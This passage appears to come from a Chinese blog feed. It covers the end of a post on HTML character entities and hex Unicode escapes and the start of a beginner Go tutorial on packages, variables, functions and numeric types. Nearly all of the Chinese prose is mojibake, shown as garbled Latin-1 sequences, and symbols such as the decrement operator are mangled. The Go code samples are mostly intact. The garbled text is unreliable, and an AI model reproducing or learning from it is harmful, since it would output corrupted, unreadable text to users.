<h2 id="2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ"><a href="#2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ" class="headerlink" title="2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ"></a>2ã€HTMLå®ä½“ç¼–ç â€”â€”ç¤ºä¾‹ä¸Unicodeç›¸åŒ</h2><p>å­—ç¬¦å®ä½“æ˜¯ç”¨ä¸€ä¸ªç¼–å·å†™å…¥HTMLä»£ç ä¸­æ¥ä»£æ›¿ä¸€ä¸ªå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®ç½‘é¡µæ—¶ä¼šå°†è¿™ä¸ªç¼–å·è§£æè¿˜åŸä¸ºå­—ç¬¦ä»¥ä¾›é˜…è¯»ã€‚</p>
<p>è¿™ä¹ˆåšçš„ç›®çš„ä¸»è¦æœ‰ä¸¤ä¸ªï¼š<br>ï¼‘ã€è§£å†³HTMLä»£ç ç¼–å†™ä¸­çš„ä¸€äº›é—®é¢˜ã€‚ä¾‹å¦‚éœ€è¦åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºå°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œç”±äºå®ƒä»¬æ˜¯HTMLçš„é¢„ç•™æ ‡ç­¾ï¼Œå¯èƒ½ä¼šè¢«è¯¯è§£æã€‚è¿™æ—¶å°±éœ€è¦å°†å°äºå·å’Œå¤§äºå·å†™æˆå­—ç¬¦å®ä½“ï¼š<br>å°äºå·è¿™æ ·å†™ï¼š&lt; æˆ– &lt;<br>å¤§äºå·è¿™æ ·å†™ï¼š&gt; æˆ– &gt;<br>å‰é¢çš„å†™æ³•ç§°ä¸ºå®ä½“åç§°ï¼Œåé¢çš„å†™æ³•åˆ™æ˜¯å®ä½“ç¼–å·ã€‚ISO-8859-1å­—ç¬¦é›†ï¼ˆè¥¿æ¬§è¯­è¨€ï¼‰ä¸­ä¸¤ç™¾å¤šä¸ªå­—ç¬¦è®¾å®šäº†å®ä½“åç§°ï¼Œè€Œå¯¹äºå…¶å®ƒæ‰€æœ‰å­—ç¬¦éƒ½å¯ä»¥ç”¨å®ä½“ç¼–å·æ¥ä»£æ›¿ã€‚<br>ï¼’ã€ç½‘é¡µç¼–ç é‡‡ç”¨äº†ç‰¹å®šè¯­è¨€çš„ç¼–ç ï¼Œå´éœ€è¦æ˜¾ç¤ºæ¥è‡ªå…¶å®ƒè¯­è¨€çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œç½‘é¡µç¼–ç é‡‡ç”¨äº†è¥¿æ¬§è¯­è¨€ISO-8859-1ï¼Œå´è¦åœ¨ç½‘é¡µä¸­æ˜¾ç¤ºä¸­æ–‡ï¼Œè¿™æ—¶å¿…é¡»å°†ä¸­æ–‡å­—ç¬¦ä»¥å®ä½“å½¢å¼å†™å…¥HTMLä»£ç ä¸­ã€‚</p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721194551860.png" alt="image-20220721194551860"></p>
<h2 id="3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹"><a href="#3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹"></a>3ã€16è¿›åˆ¶Unicodeâ€”â€”ç¤ºä¾‹</h2><p><u><strong>\u8fd9\u662f\u4e00</strong></u></p>
<p><img src="/post/Encrypted-ciphertext-features/image-20220721194631625.png" alt="image-20220721194631625"></p>
<p>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</p>
<p>  <strong>Â·</strong>Unicodeï¼š</p>
<p><code>www.sojson.com</code></p>
<p>  <strong>Â·</strong>16è¿›åˆ¶Unicodeï¼š</p>
<p><code>www.msxindl.com</code></p>
<p> <strong>Â·</strong>HTMLå­—ç¬¦å®ä½“ï¼š</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>â€¦.è¿˜æœ‰ä¸€äº›å¼•å…¥å¯†é’¥çš„éå¯¹ç§°å‹ç®—æ³•ï¼Œå¯ä»¥çœ‹çœ‹åŸæ–‡</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>crypto&amp;misc</tag>
      </tags>
  </entry>
  <entry>
    <title>golang</title>
    <url>//post/Go/</url>
    <content><![CDATA[<p><code>ä¸»è¦ä»é»„å“¥çš„èµ„æ–™ç¬”è®°ï¼Œå°šç¡…è°·ï¼Œä»¥åŠè°¢å…ˆæ–Œå¤§ä½¬çš„ç¬”è®°</code><strong><code>https://www.xiexianbin.cn/golang</code></strong></p>
<p><code>ä»¥åŠ</code><strong><a href="https://exercism.org/">https://exercism.org/</a></strong><code>ä¸Šé¢è¿›è¡Œç»ƒä¹ , é¡ºä¾¿æ¨èä¸€æœ¬ä¹¦ã€Šgoé»‘å¸½å­ã€‹</code></p>
<span id="more"></span>

<h2 id="GOè¯­è¨€æ¦‚è¿°"><a href="#GOè¯­è¨€æ¦‚è¿°" class="headerlink" title="GOè¯­è¨€æ¦‚è¿°"></a>GOè¯­è¨€æ¦‚è¿°</h2><blockquote>
<p>Goè¯­è¨€æ˜¯è°·æ­Œ2009å¹´å‘å¸ƒçš„ç¬¬äºŒæ¬¾å¼€æºç¼–ç¨‹è¯­è¨€,å®ƒä¸“é—¨é’ˆå¯¹å¤šå¤„ç†å™¨ç³»ç»Ÿåº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œå®ƒæ˜¯ä¸€ç§ç³»ç»Ÿè¯­è¨€å…¶éå¸¸æœ‰ç”¨å’Œå¼ºå¤§,å…¶ç¨‹åºå¯ä»¥åª²ç¾Cæˆ–C++ä»£ç çš„é€Ÿåº¦ï¼Œè€Œä¸”æ›´åŠ å®‰å…¨ã€æ”¯æŒå¹¶è¡Œè¿›ç¨‹ã€‚</p>
<p>Goæ”¯æŒé¢å‘å¯¹è±¡ï¼Œè€Œä¸”å…·æœ‰çœŸæ­£çš„é—­åŒ…(closures)å’Œåå°„ (reflection)ç­‰åŠŸèƒ½ã€‚</p>
<p>Goå¯ä»¥åœ¨ä¸æŸå¤±åº”ç”¨ç¨‹åºæ€§èƒ½çš„æƒ…å†µä¸‹é™ä½ä»£ç çš„å¤æ‚æ€§ã€‚</p>
<p>Goæ˜¯æ˜¯é™æ€å¼ºç±»å‹è¯­è¨€</p>
<p>Goè¯­è¨€å¼€å‘è€…è¢«å«åšgopherï¼Œè¿™ä¸ªå’Œä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿgopheråè®®åŒå</p>
</blockquote>
<h2 id="Goè¯­è¨€ç‰¹è‰²"><a href="#Goè¯­è¨€ç‰¹è‰²" class="headerlink" title="Goè¯­è¨€ç‰¹è‰²"></a>Goè¯­è¨€ç‰¹è‰²</h2><blockquote>
<ul>
<li>ç®€æ´ã€å¿«é€Ÿã€å®‰å…¨</li>
<li>å¹¶è¡Œã€æœ‰è¶£ã€å¼€æº</li>
<li>å†…å­˜ç®¡ç†ã€æ•°ç»„å®‰å…¨ã€ç¼–è¯‘è¿…é€Ÿ</li>
</ul>
</blockquote>
<h2 id="Goè¯­è¨€ç”¨é€”"><a href="#Goè¯­è¨€ç”¨é€”" class="headerlink" title="Goè¯­è¨€ç”¨é€”"></a>Goè¯­è¨€ç”¨é€”</h2><blockquote>
<p>Go è¯­è¨€è¢«è®¾è®¡æˆä¸€é—¨åº”ç”¨äºæ­è½½ Web æœåŠ¡å™¨ï¼Œå­˜å‚¨é›†ç¾¤æˆ–ç±»ä¼¼ç”¨é€”çš„å·¨å‹ä¸­å¤®æœåŠ¡å™¨çš„ç³»ç»Ÿç¼–ç¨‹<br>è¯­è¨€ã€‚å¯¹äºé«˜æ€§èƒ½åˆ†å¸ƒå¼ç³»ç»Ÿé¢†åŸŸè€Œè¨€ï¼ŒGo è¯­è¨€æ— ç–‘æ¯”å¤§å¤šæ•°å…¶å®ƒè¯­è¨€æœ‰ç€æ›´é«˜çš„å¼€å‘æ•ˆç‡ã€‚<br>å®ƒæä¾›äº†æµ·é‡å¹¶è¡Œçš„æ”¯æŒï¼Œè¿™å¯¹äºæ¸¸æˆæœåŠ¡ç«¯çš„å¼€å‘è€Œè¨€æ˜¯å†å¥½ä¸è¿‡äº†ã€‚</p>
</blockquote>
<h2 id="Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹"><a href="#Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹"></a>Goè¯­è¨€ç¼–è¯‘è¿‡ç¨‹</h2><p><img src="/post/Go/image-20230117215732032.png" alt="image-20230117215732032"></p>
<h2 id="å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯"><a href="#å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯" class="headerlink" title="å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯"></a>å¯æŸ¥çœ‹æ–‡æ¡£ç½‘ç«™ä¿¡æ¯</h2><blockquote>
<p>å®˜ç½‘:<br><a href="https://golang.google.cn/">https://golang.google.cn/</a><br>APIæ–‡æ¡£:<br><a href="https://golang.google.cn/doc/">https://golang.google.cn/doc/</a><br>æ•™ç¨‹:<br><a href="http://www.w3cschool.cn/go/go-tutorial.html">http://www.w3cschool.cn/go/go-tutorial.html</a><br>ä¸‹è½½:<br><a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p>
</blockquote>
<h2 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h2><p>åŸºç¡€æ¦‚å¿µå°†ä»‹ç»ä¸‰ç§ä¸»è¦çš„è¯­è¨€ç‰¹æ€§ï¼š<code>åŒ…ã€å‡½æ•°å’Œå˜é‡</code></p>
<h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><blockquote>
<p><code>Go</code> åº”ç”¨ç¨‹åºä»¥åŒ…çš„å½¢å¼ç»„ç»‡ã€‚åŒ…æ˜¯ä½äºåŒä¸€ç›®å½•ä¸­çš„æºæ–‡ä»¶çš„é›†åˆã€‚ç›®å½•ä¸­çš„æ‰€æœ‰æºæ–‡ä»¶å¿…é¡»å…±äº«ç›¸åŒçš„åŒ…åç§°ã€‚åŒ…åç§°é€šå¸¸æ˜¯å¯¼å…¥è·¯å¾„ä¸­çš„æœ€åä¸€ä¸ªç›®å½•ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚ï¼Œ</p>
<p><a href="https://golang.org/src/math/rand/">â€œmath&#x2F;randâ€åŒ…</a>ä¸­çš„æ–‡ä»¶ä»¥è¯­å¥å¼€å¤´<code>package rand</code>ã€‚</p>
<blockquote>
<p>å¯¼å…¥åŒ…æ—¶ï¼Œåªèƒ½ä½¿ç”¨&#x2F;è®¿é—®åç§°ä»¥å¤§å†™å­—æ¯å¼€å¤´çš„å®ä½“ï¼ˆå‡½æ•°ã€ç±»å‹ã€å˜é‡ã€å¸¸é‡ï¼‰ã€‚Go ä¸­æ¨èçš„å‘½åé£æ ¼æ˜¯æ ‡è¯†ç¬¦å°†ä½¿ç”¨ å‘½å<code>camelCase</code>ï¼Œé™¤äº†é‚£äº›æ„å‘³ç€å¯ä»¥è·¨åŒ…è®¿é—®çš„æ ‡è¯†ç¬¦åº”è¯¥æ˜¯<code>PascalCase</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lasagna</span><br></pre></td></tr></table></figure>

<h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>Go æ˜¯é™æ€ç±»å‹çš„ï¼Œè¿™æ„å‘³ç€æ‰€æœ‰å˜é‡åœ¨ç¼–è¯‘æ—¶éƒ½<a href="https://en.wikipedia.org/wiki/Type_system">å¿…é¡»å…·æœ‰å®šä¹‰çš„ç±»å‹ã€‚</a></p>
<p>å¯ä»¥é€šè¿‡æ˜¾å¼æŒ‡å®šç±»å‹æ¥å®šä¹‰å˜é‡ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> explicit <span class="type">int</span> <span class="comment">// æ˜¾å¼å£°æ˜</span></span><br></pre></td></tr></table></figure>

<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨åˆå§‹åŒ–å™¨ï¼Œç¼–è¯‘å™¨å°†åˆ†é…å˜é‡ç±»å‹ä»¥åŒ¹é…åˆå§‹åŒ–å™¨çš„ç±»å‹ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">implicit := <span class="number">10</span>   <span class="comment">// éšå¼å£°æ˜ä¸ºintï¼Œè‡ªåŠ¨åˆ†é…ç±»å‹</span></span><br><span class="line"><span class="comment">//ä¹Ÿå°±æ˜¯è¯´å¯ä»¥åˆ©ç”¨ := è¿›è¡Œç±»å‹å£°æ˜ï¼Œå…¶ç±»å‹ä¸ºå…¶åæ•°æ®çš„ç±»å‹</span></span><br></pre></td></tr></table></figure>

<p>å£°æ˜åï¼Œå¯ä»¥ä½¿ç”¨è¿ç®—ç¬¦ä¸ºå˜é‡èµ‹å€¼<code>=</code>ã€‚ä¸€æ—¦å£°æ˜ï¼Œå˜é‡çš„ç±»å‹å°±æ°¸è¿œä¸ä¼šæ”¹å˜ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">count := <span class="number">1</span> <span class="comment">// èµ‹åˆå€¼</span></span><br><span class="line">count = <span class="number">2</span>  <span class="comment">// æ›´æ–°æ–°å€¼</span></span><br><span class="line"></span><br><span class="line">count = <span class="literal">false</span> <span class="comment">// ç”±äºåˆ†é…äº†éâ€œintâ€ç±»å‹ï¼Œè¿™ä¼šå¼•å‘ç¼–è¯‘å™¨é”™è¯¯</span></span><br></pre></td></tr></table></figure>

<h3 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h3><p>å¸¸é‡å°±åƒå˜é‡ä¸€æ ·ä¿å­˜ä¸€æ®µæ•°æ®ï¼Œä½†å®ƒä»¬çš„å€¼åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ä¸èƒ½æ”¹å˜ã€‚</p>
<p>å¸¸é‡ä½¿ç”¨<code>const</code>å…³é”®å­—å®šä¹‰ï¼Œå¯ä»¥æ˜¯æ•°å­—ã€å­—ç¬¦ã€å­—ç¬¦ä¸²æˆ–å¸ƒå°”å€¼ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Age = <span class="number">21</span> <span class="comment">// å®šä¹‰ä¸€ä¸ªå€¼ä¸º 21 çš„æ•°å€¼å¸¸é‡ &#x27;Age&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p><code>Go</code> å‡½æ•°æ¥å—<code>é›¶ä¸ªæˆ–å¤šä¸ªå‚æ•°</code>ã€‚<strong>å‚æ•°å¿…é¡»æ˜ç¡®ç±»å‹åŒ–ï¼Œæ²¡æœ‰éšå¼å£°æ˜ç±»å‹ã€‚</strong></p>
<p><code>return</code>ä½¿ç”¨å…³é”®å­—ä»å‡½æ•°è¿”å›å€¼ã€‚</p>
<p>é€šè¿‡æŒ‡å®šå‡½æ•°åç§°å¹¶ä¸ºå‡½æ•°çš„æ¯ä¸ªå‚æ•°ä¼ é€’å‚æ•°æ¥è°ƒç”¨å‡½æ•°ã€‚</p>
<blockquote>
<p>è¯·æ³¨æ„ï¼ŒGo æ”¯æŒä¸¤ç§ç±»å‹çš„æ³¨é‡Šï¼š</p>
<p>å•è¡Œæ³¨é‡Šåœ¨å‰é¢ï¼Œå¤šè¡Œæ³¨é‡Šåœ¨å’Œ<code>//</code>ä¹‹é—´æ’å…¥ã€‚<code>/*``*/</code></p>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> greeting</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hello is a public function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> hi(name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hi is a private function.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hi</span> <span class="params">(name <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi &quot;</span> + name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="å‡½æ•°å®šä¹‰"><a href="#å‡½æ•°å®šä¹‰" class="headerlink" title="*å‡½æ•°å®šä¹‰"></a>*å‡½æ•°å®šä¹‰</h4><blockquote>
<p><code>func å‡½æ•°å(å½¢å‚åˆ—è¡¨) è¿”å›ç±»å‹åˆ—è¡¨ &#123;</code><br>  <code>å‡½æ•°ä½“</code><br><code>&#125;</code></p>
<p>è¿™é‡Œçš„è¿”å›ç±»å‹åˆ—è¡¨æ˜¯å› ä¸º<code>è¿”å›å€¼éœ€è¦æè¿°è¿”å›å€¼ç±»å‹</code></p>
</blockquote>
<h4 id="å‡½æ•°è°ƒç”¨"><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h4><blockquote>
<p>å‡½æ•°å¯ä»¥é€šè¿‡ <code>å‡½æ•°å(å®å‚åˆ—è¡¨)</code>ï¼Œåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­å®å‚çš„æ¯ä¸ªæ•°æ®ä¼šèµ‹å€¼ç»™å½¢å‚ä¸­çš„å¯¹åº”å˜é‡ï¼ˆå®å‚åˆ—è¡¨ç±»å‹å’Œæ•°é‡éœ€è¦ä¸å½¢å‚ä¸€ä¸€å¯¹åº”ï¼‰</p>
<p>ã€è¿™å’Œå¤§éƒ¨åˆ†ä»£ç çš„è°ƒç”¨å‡½æ•°æ–¹æ³•ä¸€æ ·ï¼Œä¸ç”¨å¤šè¯´ã€‘</p>
</blockquote>
<h4 id="åŸºç¡€å‡½æ•°ç¤ºä¾‹"><a href="#åŸºç¡€å‡½æ•°ç¤ºä¾‹" class="headerlink" title="*åŸºç¡€å‡½æ•°ç¤ºä¾‹"></a>*åŸºç¡€å‡½æ•°ç¤ºä¾‹</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ— å‚å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰å‚å‡½æ•°ï¼Œname ç§°ä¸ºå½¢å‚</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helloSomeone</span><span class="params">(name <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello&quot;</span>, name, <span class="string">&quot;!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰è¿”å›å€¼å‡½æ•°</span></span><br><span class="line"><span class="comment">//func add(a int, b int) int &#123;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line"><span class="comment">//å‡½æ•°å£°æ˜ä¸­[a,b]å­˜åœ¨å¤šä¸ªç›¸åŒç±»å‹[int]çš„è¿ç»­å½¢å‚ï¼Œå¯ä»¥åªä¿ç•™æœ€åä¸€ä¸ªå½¢å‚çš„ç±»å‹[a, b int]</span></span><br><span class="line">	<span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ExampleFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// æ— å‚å‡½æ•°è°ƒç”¨</span></span><br><span class="line">	hello()</span><br><span class="line">	<span class="comment">// å‡½æ•°çš„æ ‡è¯†ç¬¦ä¸º func()ï¼Œè°ƒç”¨å‡½æ•°éœ€è¦åŠ  ()</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, hello)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// æœ‰å‚å‡½æ•°è°ƒç”¨</span></span><br><span class="line">	helloSomeone(<span class="string">&quot;xianbin&quot;</span>) <span class="comment">// name = &quot;xianbin&quot; ä¸ºå®å‚ï¼Œè°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ é€’ç»™å‡½æ•°çš„å½¢å‚</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, helloSomeone)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// æœ‰è¿”å›å€¼å‡½æ•°è°ƒç”¨</span></span><br><span class="line">	sum := add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(sum)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, add)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// å‡½æ•°çš„ç±»å‹</span></span><br><span class="line">	<span class="keyword">var</span> f <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span> <span class="type">int</span></span><br><span class="line">    <span class="comment">//å‡½æ•°[func(int, int) int]ä¹Ÿå¯ä»¥èµ‹å€¼ç»™å˜é‡[var f]ï¼Œä¹Ÿå¯ä»¥å½“æˆå®å‚[f(1, 2)]èµ‹å€¼ç»™å¦ä¸€ä¸ªå‡½æ•°[fmt.Println()]ä½œä¸ºå½¢å‚ã€‚</span></span><br><span class="line">	f = add</span><br><span class="line">	fmt.Println(f(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Output:</span></span><br><span class="line">	<span class="comment">//Hello World!</span></span><br><span class="line">	<span class="comment">//func()</span></span><br><span class="line">	<span class="comment">//Hello xianbin !</span></span><br><span class="line">	<span class="comment">//func(string)</span></span><br><span class="line">	<span class="comment">//3</span></span><br><span class="line">	<span class="comment">//func(int, int) int</span></span><br><span class="line">	<span class="comment">//3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ•°å­—"><a href="#æ•°å­—" class="headerlink" title="æ•°å­—"></a>æ•°å­—</h2><p>Go åŒ…å«åŸºæœ¬çš„æ•°å­—ç±»å‹ï¼Œå¯ä»¥è¡¨ç¤ºæ•´æ•°æˆ–æµ®ç‚¹å€¼çš„é›†åˆã€‚</p>
<p>è¿™ä¸ªæ¦‚å¿µå°†é›†ä¸­åœ¨ä¸¤ç§æ•°å­—ç±»å‹ä¸Šï¼š</p>
<blockquote>
<ul>
<li><code>int</code>ï¼šä¾‹å¦‚<code>0</code>ï¼Œï¼Œ<code>255</code>ã€‚<code>2147483647</code>å¤§å°è‡³å°‘ä¸º 32 ä½çš„å¸¦ç¬¦å·æ•´æ•°ï¼ˆå€¼èŒƒå›´ï¼š-2147483648 åˆ° 2147483647ï¼‰ã€‚ä½†è¿™å°†å–å†³äºç³»ç»Ÿæ¶æ„ã€‚å¤§å¤šæ•°ç°ä»£è®¡ç®—æœºéƒ½æ˜¯ 64 ä½çš„ï¼Œå› æ­¤<code>int</code>å¤§å°ä¸º 64 ä½ï¼ˆå–å€¼ç‡ä¸ºï¼š-9223372036854775808 åˆ° 9223372036854775807ï¼‰ã€‚</li>
<li><code>float64</code>ï¼šä¾‹å¦‚<code>0.0</code>ï¼Œ<code>3.14</code>ã€‚åŒ…å«æ‰€æœ‰ 64 ä½æµ®ç‚¹æ•°çš„é›†åˆã€‚</li>
</ul>
</blockquote>
<p><code>+</code>Go æ”¯æŒ, <code>-</code>, <code>*</code>,<code>/</code> å’Œ<code>%</code>ï¼ˆä½™æ•°ä¸å–æ¨¡ï¼‰çš„æ ‡å‡†ç®—æœ¯è¿ç®—ç¬¦é›†ã€‚</p>
<p>åœ¨ Go ä¸­ï¼Œä¸åŒç±»å‹ä¹‹é—´çš„èµ‹å€¼éœ€è¦æ˜¾å¼è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œè¦å°† an <code>int</code> è½¬æ¢ä¸º a <code>float64</code>ï¼Œ</p>
<p>æ‚¨éœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<code>an := float64(a)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line">f := <span class="type">float64</span>(x)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;x is of type: %s\n&quot;</span>, reflect.TypeOf(x))</span><br><span class="line"><span class="comment">// Output: x is of type: int</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;f is of type: %s\n&quot;</span>, reflect.TypeOf(f))</span><br><span class="line"><span class="comment">// Output: f is of type: float64</span></span><br></pre></td></tr></table></figure>

<h3 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h3><p><code>Go</code>çš„è®¡ç®—ç¬¦ä½¿ç”¨ä»¥åŠè¿ç®—ç®€å†™å’Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ä¸€æ ·</p>
<blockquote>
<p>å¯¹äºæ•´æ•°é™¤æ³•ï¼Œä½™æ•°è¢«ä¸¢å¼ƒï¼ˆä¾‹å¦‚<code>5 / 2 == 2</code>ï¼‰ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„</p>
<p>ç®€å†™ï¼Œå¦‚</p>
<p>a+&#x3D;5</p>
<p>a++</p>
<p>aâ€“</p>
</blockquote>
<h4 id="ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—"><a href="#ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—" class="headerlink" title="ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—"></a>ä¸åŒç±»å‹çš„ç®—æœ¯è¿ç®—</h4><p>åœ¨è®¸å¤šè¯­è¨€ä¸­ï¼Œæ‚¨å¯ä»¥å¯¹ä¸åŒç±»å‹çš„å˜é‡æ‰§è¡Œç®—æœ¯è¿ç®—ï¼Œä½†åœ¨ Go ä¸­ï¼Œè¿™ä¼šäº§ç”Ÿé”™è¯¯ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// this line produces an error</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * x <span class="comment">// invalid operation: mismatched types float32 and int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// you must convert int type to float32 before performing arithmetic operation</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * <span class="type">float32</span>(x)</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ç”±äºè¿™æ ·é«˜ç²¾åº¦å’Œä½ç²¾åº¦è¿›è¡Œè®¡ç®—ï¼Œä¼šå¯¼è‡´ç²¾åº¦ä¸¢å¤±ï¼Œéœ€è¦å…ˆå°†ä½ç²¾åº¦ç±»å‹è½¬åŒ–ä¸ºé«˜ç²¾åº¦ç±»å‹ï¼Œå†è¿›è¡Œè®¡ç®—</p>
<h2 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h2><p>å’Œå¤§éƒ¨åˆ†ä»£ç ä¸€æ ·</p>
<p>Go ä¸­çš„å¸ƒå°”å€¼ç”±<code>bool</code>ç±»å‹è¡¨ç¤ºã€‚<code>bool</code>æ˜¯<code>true</code>æˆ–<code>false</code>ã€‚</p>
<p>Go æ”¯æŒä¸‰ç§å¸ƒå°”è¿ç®—ç¬¦ï¼š<code>!</code>(NOT)ã€<code>&amp;&amp;</code>(AND) å’Œ<code>||</code>(OR)ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span> || <span class="literal">false</span> <span class="comment">// =&gt; true</span></span><br><span class="line"><span class="literal">true</span> &amp;&amp; <span class="literal">false</span> <span class="comment">// =&gt; false</span></span><br><span class="line">!<span class="literal">true</span> <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure>

